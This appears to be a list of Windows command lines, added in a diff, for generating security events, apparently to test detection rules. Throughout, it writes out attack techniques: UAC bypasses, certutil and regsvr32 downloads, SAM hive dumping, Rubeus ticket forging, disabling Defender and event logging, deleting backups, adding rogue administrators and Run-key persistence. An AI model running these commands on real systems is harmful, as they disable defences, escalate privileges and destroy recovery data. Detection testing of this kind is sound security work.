+powershell -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start eventvwr.msc' -Verb RunAs"
+Start-Process sdclt.exe -ArgumentList '/kickoffelev'
+powershell -Command "Invoke-WebRequest -Uri 'http://example.com/file.txt' -OutFile 'C:\Users\Public\file.txt'"
+certutil -urlcache -split -f http://example.com/file.exe C:\Users\Public\file.exe
+Start-Process -FilePath 'rundll32.exe' -ArgumentList 'url.dll
+net user testuser /delete
+powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders' -Name 'SecurityProviders' -Value 'credssp.dll'"
+regedit /s C:\path\to\dummy.reg
+regini.exe test.ini
+powershell -Command "Start-Process -FilePath 'rundll32.exe' -ArgumentList 'scrobj.dll
+powershell -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c reg save HKLM\SYSTEM C:\Windows\Temp\system.hive' -NoNewWindow -PassThru"
+runas /user:Administrator /netonly "cmd.exe /c echo Test"
+powershell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command Get-ADUser -Filter * -Properties SIDHistory'"
+powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U29tZSBzdHJpbmc='))"
+Start-BitsTransfer -Priority foreground -Source 'http://example.com/file.txt' -Destination 'C:\Users\Public\file.txt'
+bitsadmin /create /download TestJob
+wevtutil sl Microsoft-Windows-Windows Firewall With Advanced Security/Firewall disable
+auditpol /set /subcategory:"Filtering Platform Policy Change" /success:enable
+net user testadmin /active:no
+New-LocalUser -Name 'TestUser' -NoPassword
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'GroupPolicyRefreshTime' -Value 60
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile' -Name 'EnableFirewall' -Value 0
+powershell -Command "New-NetFirewallRule -DisplayName 'Simulate DMZ to Internal Traffic' -Direction Inbound -Action Allow -RemoteAddress 192.168.1.1 -LocalAddress 10.0.0.1 -Protocol TCP -LocalPort 80"
+powershell -Command "New-NetFirewallRule -DisplayName 'Allow Telnet' -Direction Inbound -Protocol TCP -LocalPort 23 -Action Allow"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-apt34-url.com')"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-russian-url.com')"
+powershell -Command "New-NetFirewallRule -DisplayName 'Simulate SMB Exploit' -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow"
+Invoke-WebRequest -Uri 'http://example.com' -UserAgent 'sqlmap' -Headers @{Host='malicious.com'}
+Invoke-WebRequest -Uri 'http://localhost/test?param1=value1&param1=value2' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://localhost/test?input=../../../../etc/passwd' -UserAgent 'Mozilla/5.0 (Windows NT 10.0
+powershell -Command "Invoke-WebRequest -Uri http://malicious-phishing-ip.com -UseBasicParsing"
+Invoke-WebRequest -Uri 'http://malicious-apt41-url.com' -UseBasicParsing
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-lyceum-url.com')"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('emotet-botnet-ip.com')"
+Invoke-WebRequest -Uri 'http://malicious-phishing-url.com' -UseBasicParsing
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\AgentTeslaTestFile.txt'
+Invoke-WebRequest -Uri 'http://malicious-apt34-url.com' -UseBasicParsing
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Net.Mail')
+Invoke-WebRequest -Uri 'http://localhost/test?param1=value1&param1=value2' -Method GET
+wevtutil qe Security /q:"*[System[(EventID=6273)]]" /rd:true /f:text
+echo "<Event><System><Provider Name='LoadBalancer'/><EventID>4625</EventID></System><EventData><Data Name='TargetUserName'>/etc/passwd</Data><Data Name='IpAddress'>192.168.1.1</Data></EventData></Event>" > C:\Windows\Temp\event.xml
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-phishing-site.com')"
+New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -RemoteAddress 192.168.1.1 -LocalAddress 10.0.0.1 -Protocol TCP -LocalPort 80
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\maliciousfile.exe'
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\AgentTeslaTest.txt'
+Invoke-WebRequest -Uri 'http://malicious-apt28-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-russian-url.com' -UseBasicParsing
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\malicious_file.txt'
+Send-MailMessage -From 'internal@company.com' -To 'external@spamhost.com' -Subject 'Test Email' -Body 'This is a test email to trigger event' -SmtpServer 'mail.company.com'
+Invoke-Expression 'Add-DhcpServerv4Lease -ScopeId 192.168.1.0 -IPAddress 192.168.1.10 -ClientId "00-11-22-33-44-55" -Description "Test Lease"'
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-example.com')"
+Invoke-WebRequest -Uri 'http://example.com' -Headers @{'User-Agent'='sqlmap'}
+Invoke-WebRequest -Uri 'http://localhost/test?param1=value&param1=value2' -Method GET
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.DirectoryServices.Protocols') | Out-Null
+powershell -Command "Invoke-WebRequest -Uri http://malicious-phishing-site.com -UseBasicParsing"
+Test-NetConnection -ComputerName <SilenceGroupIP> -Port 80
+Invoke-WebRequest -Uri 'http://malicious-lyceum-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-url.com' -UseBasicParsing
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\maliciousfile.txt'
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\phishing_test.txt'
+powershell -Command "[System.Net.Dns]::GetHostAddresses('emotetbotnet.com')"
+Invoke-WebRequest -Uri 'http://malicious-houdini-url.com' -UseBasicParsing
+powershell -Command "Invoke-WebRequest -Uri http://malicious-lazarus-ip.com -UseBasicParsing"
+powershell -Command "[System.Net.Dns]::GetHostAddresses('known-malicious-domain.com')"
+Invoke-WebRequest -Uri 'http://malicious-lazarus-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri http://malicious-domain.com -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-silencegroup-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-ta505-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-otogonderici-url.com' -Method GET
+Resolve-DnsName -Name 'malicious-lazarus-site.com' -Type A
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\trickbot_test.txt'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Invoke-WebRequest -Uri http://example.com/mining -UseBasicParsing"' -NoNewWindow
+powershell -Command "Invoke-WebRequest -Uri http://anonymization-service.com -UseBasicParsing"
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\CitrixNetscaler' -Name 'TestEvent' -Value 'admin' -Force
+net use \\localhost\IPC$ /user:fakeuser wrongpassword
+runas /user:DOMAIN\ServiceUser "cmd.exe /c echo Successful Login"
+net user testuser /active:yes
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.DirectoryServices.AccountManagement') | Out-Null
+New-ADGroup -Name 'TestGroup' -SamAccountName 'TestGroup' -GroupCategory Security -GroupScope Global
+Add-ADGroupMember -Identity 'Domain Admins' -Members 'TestUser'
+net user testuser /add && net localgroup "Administrators" testuser /add
+Remove-ADUser -Identity 'testuser' -Confirm:$false
+New-ADUser -Name 'TestUser' -SamAccountName 'TestUser' -UserPrincipalName 'TestUser@domain.com' -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force) -Enabled $true -PassThru | Set-ADUser -DoesNotRequirePreAuth $true
+New-LocalUser -Name 'TestUser' -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -PasswordNeverExpires $true
+New-LocalUser -Name TestUser -Description 'Test user account creation for event ID 4720'
+New-LocalUser -Name 'TestUser' -Description 'Temporary user for event generation' -NoPassword
+New-LocalUser -Name 'TestUser' -Description 'Test user account for event generation' -NoPassword
+powershell -Command "New-NetFirewallRule -DisplayName 'TestP2PConnection' -Direction Outbound -Action Allow -Protocol TCP -RemotePort 6881 -RemoteAddress 8.8.8.8"
+New-NetFirewallRule -DisplayName 'Allow VNC' -Direction Outbound -LocalPort 5900 -Protocol TCP -Action Allow
+Invoke-WebRequest -Uri 'http://malicious-covid19-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-lokibot-url.com' -Method GET
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\malicious_file.txt'
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\azorult_test.txt'
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\nanocore_test.txt'
+powershell -Command "[System.Net.Dns]::GetHostAddresses('malicious-qbot-ip.com')"
+Invoke-WebRequest -Uri 'http://malicious-hidden-cobra-url.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-quasarrat-url.com' -Method GET
+Invoke-WebRequest -Uri 'http://malicious-example.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-ryuk-url.com' -UseBasicParsing
+powershell -Command "Invoke-WebRequest -Uri http://malicious-apt41-ip.com -UseBasicParsing"
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\SolarWindsTestFile.txt'
+Invoke-WebRequest -Uri 'http://malicious-solarwinds-url.com' -UseBasicParsing
+icacls C:\WINDOWS\SYSTEM32\CONFIG\SAM /grant Everyone:F
+Invoke-WebRequest -Uri 'http://localhost:8080/test?jndi=ldap://malicious.com' -UserAgent 'Mozilla/5.0 (Windows NT 10.0
+powershell -Command "[System.Net.Dns]::GetHostEntry('jndi:ldap://example.com')"
+Start-Process msdt.exe -ArgumentList 'ms-msdt:-id IT_BrowseForFile'
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Net')
+powershell -Command "Start-Process -FilePath 'C:\Windows\System32\notepad.exe' -ArgumentList 'http://malicious.example.com' -NoNewWindow"
+powershell -Command "Start-Process notepad.exe -ArgumentList 'maliciousfile.txt'"
+New-LocalUser -Name 'TestUser' -Description 'Test user account creation for event generation' -NoPassword
+Start-Process -FilePath 'C:\Program Files\Trend Micro\Deep Security Agent\dsa_control.exe' -ArgumentList 'deregister' -NoNewWindow -Wait
+Invoke-Expression '[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+Start-Process -FilePath 'C:\Program Files\Trend Micro\Deep Security Agent\dsa_control.exe' -ArgumentList 'user_unlock' -NoNewWindow
+Add-MpPreference -ExclusionPath 'C:\Temp\TestFolder'
+New-LocalUser -Name 'TestUser' -Description 'Test user for event generation' -NoPassword
+New-LocalUser -Name 'TestUser' -Description 'Temporary user for event generation'
+Set-ADObject -Identity 'CN=TestObject
+Invoke-WebRequest -Uri 'http://example-phishing-site.com' -UseBasicParsing
+powershell -Command "[System.Net.Dns]::GetHostAddresses('cryptomining.example.com')"
+Invoke-WebRequest -Uri 'http://malicious-url.com' -Headers @{"User-Agent"="610E48C6-FB00-4C2B-9C77-778D6E11613E"}
+Invoke-WebRequest -Uri 'http://malicious-domain.com' -UseBasicParsing
+New-NetFirewallRule -DisplayName 'TestSLPConnection' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 427 -RemoteAddress 192.168.1.1
+wevtutil sl Microsoft-Windows-NetworkPolicyServer/Operational /e:true
+New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1801 -RemoteAddress 192.168.1.1
+net user testuser NewPassword123! /domain
+Invoke-WebRequest -Uri http://example.zip -UseBasicParsing
+powershell -Command "Start-Process -FilePath 'cscript.exe' -ArgumentList 'C:\path\to\script.sct'"
+Invoke-WebRequest -Uri 'http://suspicious-url.com' -UseBasicParsing
+Start-Process -FilePath 'C:\Windows\System32\notepad.exe' -ArgumentList 'C:\Windows\System32\calc.exe' -NoNewWindow
+Add-MpPreference -ExclusionPath 'C:\PathToExclude'
+Invoke-WebRequest -Uri 'http://malicious-lockbit-domain.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-lummastealer-domain.com' -UseBasicParsing
+Invoke-WebRequest -Uri 'http://malicious-wordpress-site.com' -UseBasicParsing
+Invoke-WebRequest -Uri http://example.com -UseBasicParsing
+New-ADUser -Name 'TestUser' -SamAccountName 'TestUser' -UserPrincipalName 'TestUser@domain.com' -Path 'OU=Users
+net user TestUser /add && net user TestUser /delete
+powershell -Command "New-NetFirewallRule -DisplayName 'TestRule' -Direction Outbound -Action Allow -RemoteAddress 192.0.2.1
+New-NetFirewallRule -DisplayName 'SMTP Test Rule' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 25
+Set-ADUser -Identity 'TestUser' -MobilePhone '+1234567890'
+New-NetFirewallRule -DisplayName 'TestRule' -Direction Inbound -LocalPort 1801 -Protocol TCP -Action Allow
+start excel.exe /w Dataexchange.dll
+start zenmap.exe
+Start-Process -FilePath 'C:\Path\To\xordump.exe'
+Start-Process -FilePath 'C:\Path\To\CleanWipe.exe'
+powershell -Command "Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList '/w test.docm'"
+eventcreate /ID 1 /L APPLICATION /T INFORMATION /SO 'PROXY PRODUCTS' /D 'LogSourceController: PROXY PRODUCTS Stopped for Logging'
+powershell -Command "Send-MailMessage -From 'malicious@domain.com' -To 'victim@domain.com' -Subject 'Test' -Body 'This is a test email' -SmtpServer '192.168.1.100'"
+powershell -Command "[System.IO.File]::WriteAllText('C:\Windows\Temp\LazarusMailSubject.txt'
+powershell -Command "[System.IO.File]::WriteAllText('C:\SpamMailSubject.txt'
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c time 12:00:00' -Verb RunAs
+powershell -Command "Invoke-Expression 'WScript.Shell'"
+powershell -Command "Send-MailMessage -From 'phishing@example.com' -To 'user@localdomain.com' -Subject 'Test Phishing Email' -Body 'This is a test email for phishing detection.' -SmtpServer 'smtp.localdomain.com'"
+powershell -Command "[System.IO.File]::WriteAllText('C:\Test\malicious.docm'
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableRealtimeMonitoring' -Value 1
+sc stop WinDefend
+eventcreate /ID 1 /L APPLICATION /T INFORMATION /SO 'MAIL GW PRODUCTS' /D 'LogSourceController: MAIL GW PRODUCTS Stopped for Logging'
+Start-Process -FilePath notepad.exe -ArgumentList '/c start powershell.exe' -NoNewWindow
+powershell -Command "[System.IO.File]::WriteAllText('C:\temp\medusa_test.txt'
+Start-Process -FilePath 'notepad.exe' -ArgumentList 'C:\Windows\System32\drivers\etc\hosts' -Wait
+rundll32.exe kernel32.dll
+Start-Process -FilePath 'C:\Windows\System32\wbem\cimprovider.exe' -ArgumentList '/c start notepad.exe'
+mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""notepad.exe"" ")(window.close)
+rundll32.exe setupapi.dll
+hh.exe ms-its:C:\Windows\Help\mui\0409\diskmgt.chm::/html/sample.htm
+Start-Process -FilePath C:\Windows\Temp\suspicious.cpl
+Start-Process mshta.exe -ArgumentList 'http://example.com/script.hta'
+Start-Process msiexec.exe -ArgumentList '/i'
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+rundll32.exe C:\Path\To\Malicious.dll
+powershell -Command "Start-Process -FilePath 'wscript.exe' -ArgumentList 'javascript: var obj = GetObject(""winmgmts:"")
+Start-Process -FilePath 'C:\Windows\System32\mavinject.exe' -ArgumentList '1234
+icacls C:\TestFolder /grant Everyone:F
+net stop 'Active Directory Domain Services'
+taskkill /im notepad.exe /f
+wmic shadowcopy call create Volume='C:\'
+vssadmin list shadows
+wbadmin delete systemstatebackup -quiet
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Start-Sleep -Seconds 5"' -NoNewWindow -PassThru
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "Write-Host PowerPXE Test"'
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestValue /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestPersistence /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TestPersistence' -Value 'C:\Windows\System32\notepad.exe'
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'AutoAdminLogon' -Value '1'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "New-Item -Path C:\Windows\System32\spool\drivers\x64\3\easysystemshell.dll -ItemType File"'
+Rubeus.exe asktgt /user:exampleuser /rc4:examplehash /ptt
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Write-Host sekurlsa
+powershell -Command "Start-Process -FilePath 'notepad.exe' -ArgumentList '/c echo kerberos golden ticket'"
+Rubeus.exe asktgt /user:username /rc4:hash /domain:domain.com /ticket:golden /ptt
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo test | findstr password'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Write-Host misc::efs"'
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo test' -NoNewWindow
+powershell -Command "Import-Module ActiveDirectory
+powershell -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c setspn -L username'"
+New-ADUser -Name 'TestUser' -SamAccountName 'TestUser' -UserPrincipalName 'TestUser@domain.com' -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -PassThru | Set-ADUser -DoesNotRequirePreAuth $true
+Stop-Service -Name 'wscsvc'
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+auditpol /clear
+Start-Process -FilePath 'net.exe' -ArgumentList 'stop wuauserv'
+Stop-Service -Name 'wuauserv'
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Security /v Enabled /t REG_DWORD /d 0 /f
+wevtutil sl Microsoft-Windows-Firewall/FirewallLog /e:false
+netsh advfirewall show allprofiles
+bcdedit /set {current} bootstatuspolicy ignoreallfailures
+powershell.exe -Command "[System.Diagnostics.EventLog]::WriteEntry('Application'
+Stop-Service -Name 'ds_agent' -Force
+Stop-Service -Name 'eventlog' -Force
+Stop-Service -Name 'WinCollect' -Force
+net user testuser /active:no
+sc.exe create TestService binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
+netsh interface ip set address "Local Area Connection" static 192.168.0.2 255.255.255.0 192.168.0.1 1
+New-Service -Name 'TestService' -BinaryPathName 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Description 'Test Service' -StartupType Manual
+psexec.exe \\localhost -accepteula -s cmd.exe /c echo Test
+Start-Process -FilePath 'StandIn.exe' -ArgumentList '--dns --limit'
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-Command "[System.Reflection.Assembly]::LoadWithPartialName(\"System.Security\")
+powershell -Command "Start-Process -FilePath 'certutil.exe' -ArgumentList 'find /vulnerable'"
+Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile -Command "Write-Host --adcs"'
+Start-Process -FilePath 'certipy.exe' -ArgumentList 'find'
+wevtutil sl Security /ms:524288000
+net stop w32time && net start w32time
+echo . | convertto-json | out-file -filepath C:\temp\test.json
+powershell -Command "[System.IO.File]::WriteAllText('C:\custom\bin\legitScript.ps1'
+ssh.exe -L 8080:localhost:80
+net user /add TestUser TestPassword123!
+net localgroup TestGroup /add
+net user /add TestUser TestPassword123
+net user TestUser /add && net user TestUser /active:no
+net user testuser Test123! /add && net user testuser /active:no
+net user TestUser TestPassword123 /add && timeout /t 5 && net user TestUser /delete
+net user /add TestUser TestPassword123! && net accounts /maxpwage:unlimited && net user TestUser /passwordreq:no
+net user /add testuser TestPassword123! && wmic USERACCOUNT WHERE Name='testuser' SET PasswordExpires=FALSE
+dsacls.exe C:\ /T /G Everyone:R
+PowerShell -Command "New-EventLog -LogName 'Application' -Source 'Security'
+Add-Content -Path 'C:\Windows\Temp\auth_policy.log' -Value '[Authentication.Policy Added] Rule matched: NOPASSWD for non-authorized user'
+New-Item -Path 'HKLM:\Software\Classes\ms-settings\shell\open\command' -Value 'powershell.exe' -Force
+psexec -i -s cmd.exe /c whoami
+powershell -Command "(New-Item 'HKLM:\Software\TempTestKey' -Force
+runas /user:ServiceAccount cmd
+runas /user:Administrator cmd
+Add-ADGroupMember -Identity "Domain Admins" -Members "NewAdmin"
+net localgroup administrators [username] /add
+net user regularuser * /add && net localgroup administrators regularuser /add
+powershell -Command "New-LocalUser -Name 'SecureUser' -Password (ConvertTo-SecureString 'SecureP@ssw0rd' -AsPlainText -Force)
+net localgroup "CyberArk_Audit" User123 /add
+net localgroup Administrators unauthorized_user /add
+auditpol /set /subcategory:"Domain Trust" /success:enable
+net user superuser /add && net localgroup Administrators superuser /add
+New-DomainGroup -Name 'TestGroup' -Path 'CN=Users
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
+net user /delete TestUser
+net stop dhcp
+net user [username] /active:no
+Remove-AzLocalNetworkGateway -Name 'MyGateway' -ResourceGroupName 'MyResourceGroup'
+echo 'Simulating Disk Failure' > C:\temp\disk_failure_simulation.txt && fsutil volume dismount C:\
+fsutil file createnew C:\temp\testfile.txt 5000000000
+echo Y | powershell.exe -NoProfile -Command "Add-Type -TypeDefinition 'public class DiskSpace { public static void Fill() { var stream = new System.IO.FileStream("C:\\temp\\dummy.txt"
+echo 'This is a test' > C:\non_existent_path\test.txt
+az network watcher delete --name MyNetworkWatcher --resource-group MyResourceGroup
+az network vnet delete --name ExampleVnet --resource-group ExampleGroup
